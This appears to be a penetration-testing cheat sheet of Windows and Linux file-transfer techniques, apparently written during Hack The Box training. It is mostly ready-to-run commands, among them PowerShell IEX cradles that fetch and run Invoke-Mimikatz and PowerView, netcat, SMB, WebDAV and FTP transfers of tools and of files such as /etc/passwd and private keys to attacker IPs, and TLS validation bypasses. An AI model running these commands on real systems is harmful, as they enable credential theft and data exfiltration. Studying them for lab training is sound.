# Windows Transfer Methods


#### Content Copy

- generate hash to check 
```shell-session
md5sum id_rsa
```

- base64 encode contents
```shell-session
cat id_rsa |base64 -w 0;echo
```

- copy content & decode at victim machine
```powershell-session
PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("ZTRmZWVjNDY2ZDVkZTcwMTA4OWI1Y2MxYmY2ZDU5MmE="))
```
- check hash of file
```powershell
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```
## Downloads
## PowerShell Web Downloads

- Download files using class name `Net.WebClient` and the method `DownloadFile`
```powershell-session
(New-Object Net.WebClient).DownloadFile('http://10.10.15.117/upload_win.txt','upload.txt')
```

```powershell-session
(New-Object Net.WebClient).DownloadFileAsync('http://10.10.15.117/upload_win.txt','upload.txt')
```

-  Fileless Method (execute file without copy in system) using [Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) or the alias `IEX`
```powershell-session
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

```powershell-session
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

- Download file using [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2)
```powershell-session
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

- download cradles [here](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)

#### Common Errors with PowerShell

- Internet Explorer first-launch configuration has not been completed use `-UseBasicParsing`
```powershell-session
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

- SSL/TLS not Trusted

```powershell-session
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

- Using SMB 
server
```shell-session
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

```shell-session
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```
client
```cmd-session
copy \\192.168.220.133\share\nc.exe
```

```cmd-session
net use n: \\192.168.220.133\share /user:test test
```

- using FTP

server
```shell-session
sudo python3 -m pyftpdlib --port 21
```

client
```powershell-session
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```


- using command file

```cmd-session
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```



## Upload Operations


```powershell-session
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```

```shell-session
pradyun2005@htb[/htb]$ echo base64_content | base64 -d > hosts
```


- Using Upload server

file upload UI available at `/upload` dir
```shell-session
python3 -m uploadserver
```


PowerShell Script to Upload a File to Python Upload Server, using `PSUpload.ps1
`
```powershell-session
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
```

```powershell-session
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

- Base64 Upload
sender
```powershell-session
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
```

```powershell-session
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

receiver

```shell-session
nc -lvnp 8000
```

- using SMB

reciever
```shell-session
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
```

sender (DavWWWRoot is for / directory)
```cmd-session
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
```

```cmd-session
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

- using FTP

```shell-session
sudo python3 -m pyftpdlib --port 21 --write
```

```powershell-session
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```



# Linux File Transfers

### Download
- base64 encode file content -> copy => paste =>base64 decode get file content 
- using wget , curl 
- fileless upload `|sh`

- Download using Bash

```shell-session
exec 3<>/dev/tcp/10.10.10.32/80
```

```shell-session
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

```shell-session
cat <&3
```


- using SCP
```shell-session
scp plaintext@192.168.49.128:/root/myroot.txt . 
```



### Download

- using upload server

create certificate
```shell-session
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

```shell-session
 python3 -m uploadserver 1111 --server-certificate ~/server.pem
```
upload
```shell-session
curl -X POST https://10.10.14.24:1111/upload -F 'files=@/home/junior/a.pdf' --insecure
```



- using python server and wget,curl

- using scp
```shell-session
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```

## File Transfer using Code


- Python 2
```shell-session
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```


- python 3

```shell-session
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

- Php
```shell-session
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```
```shell-session
php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

- ruby
```shell-session
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

- perl
```shell-session
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```



### Misc

```shell-session
victim@target:~$ nc -l -p 8000 > SharpKatz.exe
```

```shell-session
pradyun2005@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

